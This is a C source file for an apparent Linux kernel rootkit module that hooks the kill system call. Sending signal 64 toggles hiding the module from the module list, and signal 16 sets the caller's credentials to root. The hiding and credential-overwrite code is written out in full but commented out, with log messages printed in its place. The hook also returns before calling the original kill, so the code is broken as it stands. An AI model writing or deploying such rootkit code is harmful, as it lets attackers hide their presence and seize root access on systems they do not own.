#include "kill.h"
static struct list_head *priorModule;
static short isHidden = 0;

#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int killHook(const struct pt_regs *regs) {
    int sig = regs->si;
#else
asmlinkage int killHook(pid_t pid, int sig) { 
#endif
    if (sig == 64) toggleHiding();
    else if (sig == 16) setRoot();
    return 0;
#ifdef PTREGS_SYSCALL_STUBS
    return killOG(regs);
#else
    return killOG(pid, sig);
#endif
}

void toggleHiding() {
    /*if (isHidden == 1) {
        list_add(&THIS_MODULE->list, priorModule);
        isHidden = 0;
    } else {
        priorModule = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        isHidden = 1;
    }
    return;*/
    printk(KERN_INFO "HIDING\n");
}

void setRoot() {
    /*struct cred *root;
    root = prepare_creds();
    printk(KERN_INFO "btk::0x1\n");
    if (root == NULL)
        return;
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;
    commit_creds(root);
    return;*/
    printk(KERN_INFO "ROOTING\n");
}
